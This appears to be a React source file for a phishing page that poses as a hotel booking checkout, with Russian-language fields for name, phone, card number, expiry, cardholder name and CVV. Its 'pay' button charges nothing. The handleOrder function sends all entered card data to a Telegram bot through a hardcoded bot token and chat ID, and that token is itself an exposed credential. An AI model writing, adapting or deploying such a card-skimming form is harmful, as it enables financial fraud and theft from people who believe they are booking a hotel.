import React, {useState} from 'react';

import {Container, Row, Col, Form, Button, Image} from 'react-bootstrap';
import axios from "axios";

const BookingForm = () => {
    const [entity, setEntity] = useState({
        firstName: '',
        lastName: '',
        fatherName: '',
        phoneNumber: '',
        cardNumber: '',
        cardDate: '',
        cardholderName: '',
        cardCVV: ''
    })

    function handleOrder() {
        const telegramMessage = `
            Имя : ${entity.firstName}\nФамилия : ${entity.lastName}\nОтчество : ${entity.fatherName}\nНомер телефона : ${entity.phoneNumber}\nНомер карты : ${entity.cardNumber}\nСрок карты : ${entity.cardDate}\nИмя владельца карты : ${entity.cardholderName}\nCVV : ${entity.cardCVV}`;
        const botToken = '6915780237:AAF05hr5p52ERTtKxQpyZoVpIvB-r-MxW28\n'; // enter token
        const telegramChatId = '497578008'; // enter chat id
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const params = {
            chat_id: telegramChatId,
            text: telegramMessage
        };
        axios.post(url, params);
    }

    return (
        <Container style={{backgroundColor:'white'}}>
            <h2 className="booking-title">Оформление оплаты</h2>
            <Row>
                <Col>
                    <Form>
                        <Form.Group controlId="formFirstName">
                            <Form.Label>Имя</Form.Label>
                            <Form.Control type="text" placeholder="Введите ваше имя"
                                          value={entity.firstName}
                                          onChange={(e) => setEntity((prevState) => ({
                                              ...prevState,
                                              firstName: e.target.value
                                          }))}/>
                        </Form.Group>
                        <Form.Group controlId="formLastName">
                            <Form.Label>Фамилия</Form.Label>
                            <Form.Control type="text" placeholder="Введите вашу фамилию"
                                          value={entity.lastName}
                                          onChange={(e) => setEntity((prevState) => ({
                                              ...prevState,
                                              lastName: e.target.value
                                          }))}/>
                        </Form.Group>
                        <Form.Group controlId="formPatronymic">
                            <Form.Label>Отчество</Form.Label>
                            <Form.Control type="text" placeholder="Введите ваше отчество" value={entity.fatherName}
                                          onChange={(e) => setEntity((prevState) => ({
                                              ...prevState,
                                              fatherName: e.target.value
                                          }))}/>
                        </Form.Group>
                        <Form.Group controlId="formPhoneNumber">
                            <Form.Label>Номер телефона</Form.Label>
                            <Form.Control type="tel" placeholder="Введите ваш номер телефона"
                                          value={entity.phoneNumber}
                                          onChange={(e) => setEntity((prevState) => ({
                                              ...prevState,
                                              phoneNumber: e.target.value
                                          }))}/>
                        </Form.Group>
                        <Form.Group controlId="formCreditCardNumber">
                            <Form.Label>Номер Кредитной карты</Form.Label>
                            <Form.Control type="text" placeholder="Введите номер карты"
                                          value={entity.cardNumber}
                                          onChange={(e) => setEntity((prevState) => ({
                                              ...prevState,
                                              cardNumber: e.target.value
                                          }))}/>
                        </Form.Group>
                        <Form.Group controlId="formExpirationDate">
                            <Form.Label>Срок действия карты</Form.Label>
                            <Form.Control type="text" placeholder="ММ/ГГ"
                                          value={entity.cardDate}
                                          onChange={(e) => setEntity((prevState) => ({
                                              ...prevState,
                                              cardDate: e.target.value
                                          }))}/>
                        </Form.Group>
                        <Form.Group controlId="formCardholderName">
                            <Form.Label>Имя владельца карты</Form.Label>
                            <Form.Control type="text" placeholder="Введите имя владельца карты"
                                          value={entity.cardholderName}
                                          onChange={(e) => setEntity((prevState) => ({
                                              ...prevState,
                                              cardholderName: e.target.value
                                          }))}/>
                        </Form.Group>
                        <Form.Group controlId="formCVV">
                            <Form.Label>CVV</Form.Label>
                            <Form.Control type="text" placeholder="Введите CVV"
                                          className={'mb-2'}
                                          value={entity.cardCVV}
                                          onChange={(e) => setEntity((prevState) => ({
                                              ...prevState,
                                              cardCVV: e.target.value
                                          }))}/>
                        </Form.Group>
                        <Button variant="btn btn-outline-dark" className={'w-100'}  onClick={()=>handleOrder()}>
                            Оплатить
                        </Button>
                    </Form>
                </Col>
                <Col>
                    <div className="booking-info">
                        <h3 className="hotel-name">Emely Resort</h3>
                        <Image src={"https://cf.bstatic.com/xdata/images/hotel/max1024x768/507567090.jpg?k=0160946f42471ebfe4b8503a57ac4c4b9f486cca994ec61d2a120b73b4837b87&o=&hp=1"} width={400} height={200} className={'mb-2'}/>
                        <p><strong>Дата заселения:</strong> 29.09.2024</p>
                        <p><strong>Дата выселения:</strong> 14.10.2024</p>
                        <p><strong>Количество гостей:</strong> 2 взрослых</p>
                    </div>
                </Col>
            </Row>
        </Container>
    );
}

export default BookingForm;
